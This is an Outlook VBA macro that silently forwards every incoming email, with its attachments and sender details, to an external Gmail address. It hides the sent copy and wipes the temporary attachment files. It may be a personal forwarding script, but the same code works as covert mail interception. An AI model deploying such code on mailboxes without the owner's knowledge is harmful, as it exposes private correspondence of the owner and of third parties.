VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "ThisOutlookSession"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True


'-----------------
Option Explicit
Option Compare Text
Const PR_SMTP_ADDRESS As String = "http://schemas.microsoft.com/mapi/proptag/0x39FE001E"

Private Sub Application_NewMailEx(ByVal EntryIDCollection As String)
   sAlert Application.Session.GetItemFromID(EntryIDCollection)
End Sub

Public Sub sAlert(m As Outlook.MailItem)
On Error GoTo er
    Dim a As MailItem, i As Integer, dd As String, mmm As String, ddp As String

    ddp = AttPath()
    
    Set a = Outlook.Application.CreateItem(olMailItem)
    mmm = m.To
    
    a.To = "vpupkin@gmail.com <VPupkin>"
    a.Subject = m.Sender & " [" & GetSMTPAddressForSender(m) & "] " & m.Subject
    
    If m.BodyFormat = olFormatHTML Then
        a.BodyFormat = olFormatHTML
        a.htmlbody = "<div>" & Replace(mmm, vbNewLine, "<br>") & "<hr/></div>" & m.htmlbody
    Else
        a.BodyFormat = olFormatPlain
        a.body = mmm & m.body
    End If

    For i = 1 To m.Attachments.Count
        dd = ddp & AclName(m.Attachments.Item(i).DisplayName)
        m.Attachments.Item(i).SaveAsFile dd
        a.Attachments.Add dd
    Next i

    a.DeleteAfterSubmit = True
    a.Send
    
    dd = Dir(ddp & "*.*", vbNormal)
    Do Until dd = ""
        Kill ddp & dd
        dd = Dir
    Loop

ex: Exit Sub
er: Debug.Print Now(), Err.Description
End Sub

Public Function AttPath() As String
    AttPath = VBA.Environ$("temp")
    If Dir(AttPath & "\att", vbDirectory) = "" Then MkDir AttPath & "\att"
    AttPath = AttPath & "\att\"
End Function

Function GetSMTPAddressForSender(mail As Outlook.MailItem) As String
On Error Resume Next
    Dim t As String
    t = mail.Sender.PropertyAccessor.GetProperty(PR_SMTP_ADDRESS)
    If t = "" Then
        t = mail.SenderEmailAddress
        t = Replace(t, "'", "")
    End If
    GetSMTPAddressForSender = t
End Function

Public Function AclName(ByVal a As String) As String
    If a = "" Then Exit Function
    
    AclName = a
    
    Dim i As Integer, k As Integer
    
    For i = 1 To Len(AclName)
        k = Asc(Mid(AclName, i, 1))
        If k < 32 Or k = 63 Or k = 187 Or k >= 127 And k <= 183 Then
            AclName = Left(AclName, i - 1) & "_" & Mid(AclName, i + 1)
        End If
    Next i
    
    AclName = Replace(Replace(Replace(AclName, ":", ""), """", ""), "|", "")
    AclName = Replace(Replace(AclName, "?", ""), "*", "")
    AclName = Replace(Replace(AclName, ">", ""), "<", "")
    AclName = Replace(Replace(AclName, "\", ""), "/", "")
    AclName = Replace(Replace(AclName, "   ", " "), "  ", " ")
    Do Until InStr(AclName, "  ") = 0
        AclName = Replace(AclName, "  ", " ")
    Loop
    AclName = Trim(AclName)
End Function